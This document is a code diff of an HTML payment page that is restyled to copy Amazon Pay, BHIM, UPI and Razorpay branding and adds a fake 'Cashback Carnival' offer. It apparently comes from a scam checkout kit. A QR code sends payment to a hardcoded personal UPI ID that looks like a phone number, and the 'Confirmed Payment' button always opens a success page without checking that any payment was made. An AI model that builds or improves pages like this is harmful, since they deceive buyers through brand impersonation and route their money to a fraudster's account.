@@ -1,10 +1,69 @@
 <!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>UPI Payment</title><style>
-body{margin:0;font-family:Arial,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column}.header{background:#a9d8ee;display:flex;justify-content:space-between;align-items:center;padding:16px 18px}.header-title{font-size:20px;font-weight:700}.wrap{padding:22px 20px}.box{border-top:1px solid #ddd;border-bottom:1px solid #ddd;padding:22px 0;display:flex;justify-content:space-between;align-items:center}.amt{font-size:36px;font-weight:700;color:#9b1635}.upi{font-size:18px;color:#222;line-height:1.5;margin-top:14px}.qr{margin-top:18px;border:1px solid #ddd;border-radius:12px;padding:14px;text-align:center}.qr img{width:100%;max-width:280px;height:auto;border-radius:10px}.note{margin-top:14px;font-size:16px;color:#555;line-height:1.45}.btn{width:100%;padding:18px;border:none;border-radius:6px;background:#0f6f8c;color:#fff;font-size:20px;cursor:pointer}.bottom{padding:18px 20px 28px;margin-top:auto}
-</style></head><body><div class="header"><div>☰</div><div class="header-title">TRANSACTION</div><div>💬 ?</div></div><div class="wrap"><h1>Scan & pay</h1><div class="box"><div>Total due</div><div class="amt" id="upiAmt">₹0.00</div></div><div class="upi"><b>Scan Here to Pay</b></div><div class="qr"><img id="qrImg" alt="UPI QR"><div class="bottom"><button class="btn" onclick="go()">Confirmed Payment</button></div><script>
-const a=parseFloat(localStorage.getItem('payAmount'))||0;document.getElementById('upiAmt').textContent='₹'+a.toFixed(2);
+*{box-sizing:border-box}body{margin:0;font-family:Arial,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column}
+.top{padding:10px 16px 0}
+.headrow{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
+.leftgrp{display:flex;align-items:center;gap:8px;color:#4a5fcf;font-weight:700;font-size:14px}
+.back{font-size:30px;line-height:1;color:#4a5fcf}
+.details{background:#5a63d8;color:#fff;border:none;border-radius:8px;padding:10px 14px;font-weight:700;font-size:16px}
+.amountrow{display:flex;align-items:center;gap:12px;font-size:34px;font-weight:700;color:#111;padding:0 2px 12px;border-bottom:1px solid #e8e8e8}
+.amountrow .amt{color:#111}
+.midwrap{padding:18px 18px 0}
+.orange{background:linear-gradient(135deg,#ff9a1f 0%,#ffbf35 100%);border-radius:10px;padding:16px 14px 14px;position:relative}
+.brand{display:flex;justify-content:center;margin-bottom:18px}
+.brand img{width:170px;height:40px;display:block}
+.scan{font-size:34px;font-weight:900;color:#111;text-align:center;letter-spacing:1px;margin-bottom:18px}
+.qrbox{background:#fff;bord er-radius:10px;padding:18px;width:100%;max-width:520px;margin:0 auto;box-shadow:0 1px 2px rgba(0,0,0,.12)}
+.qrbox img{width:100%;display:block;border-radius:4px}
+.tap{text-align:center;font-size:14px;font-weight:700;color:#d15d00;margin:10px 0 0}
+.bhim{padding:14px 0 10px;text-align:center}
+.bhimline{display:flex;justify-content:center;align-items:flex-end;gap:16px;margin-bottom:10px}
+.bhimline img{height:34px}
+.apps{display:flex;justify-content:center;gap:18px;margin-top:6px;align-items:center}
+.apps img{height:30px;width:auto}
+.cash{background:#ff8f1f;border-radius:6px;margin-top:10px;padding:14px 14px 10px;display:flex;align-items:center;justify-content:space-between;gap:14px}
+.cashleft{display:flex;align-items:center;gap:10px}
+.crown{font-size:28px}.cashbadge{font-size:28px;line-height:1.0;font-weight:900;color:#171717;background:#ffd95a;padding:10px 16px;border-radius:18px;box-shadow:0 2px 0 rgba(0,0,0,.1) inset}
+.cashright{font-size:18px;font-weight:700;color:#111;line-height:1.25;text-align:left}.small{font-size:12px;font-weight:400;margin-top:8px;text-align:center}
+.foot{padding:16px 0 12px;text-align:center}.foot img{height:28px}
+.confirmwrap{padding:16px 18px 24px;background:#fff}.btn{width:100%;padding:18px;border:none;border-radius:8px;background:#0f6f8c;color:#fff;font-size:20px;cursor:pointer}
+</style></head><body>
+<div class="top">
+  <div class="headrow">
+    <div class="leftgrp"><div class="back">&#8592;</div><div>BHIAA! &#128178; UPI/Bharat QR</div></div>
+    <button class="details">DETAILS</button>
+  </div>
+  <div class="amountrow"><div>₹</div><div class="amt" id="upiAmt">0.00</div></div>
+</div>
+<div class="midwrap">
+  <div class="orange">
+    <div class="brand">
+  <img src="images/APay.png" alt="Amazon Pay" style="width:170px;height:40px;display:block;object-fit:contain">
+</div>
+    <div class="qrbox"><img id="qrImg" alt="UPI QR"></div>
+    <div class="tap">TAP TO ENLARGE</div>
+  </div>
+  <div class="bhim">
+    <div class="bhimline"><img src="images/BHIM_logo.svg" alt="BHIM"><img src="images/UPI_logo.svg" alt="UPI"></div>
+    <div class="apps">
+      <img src="images/amazon-pay-icon.svg" alt="amazon pay">
+      <img src="images/google-pay-icon.svg" alt="google pay">
+      <img src="images/phonepe-icon.svg" alt="phonepe">
+      <img src="images/paytm-icon.svg" alt="paytm">
+    </div>
+  </div>
+  <div class="cash">
+    <div class="cashleft"><div class="crown">👑</div><div class="cashbadge">Cashback<br>Carnival</div></div>
+    <div class="cashright">Up to ₹10 back*<br>Scan &amp; Pay using Amazon app<div class="small">Valid 10 times per user | T&amp;C apply</div></div>
+  </div>
+  <div class="foot"><img src="images/razorpay-icon.svg" alt="Razorpay"></div>
+</div>
+<div class="confirmwrap"><button class="btn" onclick="go()">Confirmed Payment</button></div>
+<script>
+const a=parseFloat(localStorage.getItem('payAmount'))||0;document.getElementById('upiAmt').textContent=a.toFixed(2);
 const upiId='8639632255@ybl';const payeeName='LLP 2.0';const tn='Mobile Exchange Payment';const am=a.toFixed(2);
 const upiString=`upi://pay?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${am}&cu=INR&tn=${encodeURIComponent(tn)}`;
-document.getElementById('qrImg').src='https://api.qrserver.com/v1/create-qr-code/?size=280x280&data='+encodeURIComponent(upiString);
+document.getElementById('qrImg').src='https://api.qrserver.com/v1/create-qr-code/?size=360x360&data='+encodeURIComponent(upiString);
 function go(){location.href='Final_Success.html';}
-</script></body></html>
+</script>
+</body></html>
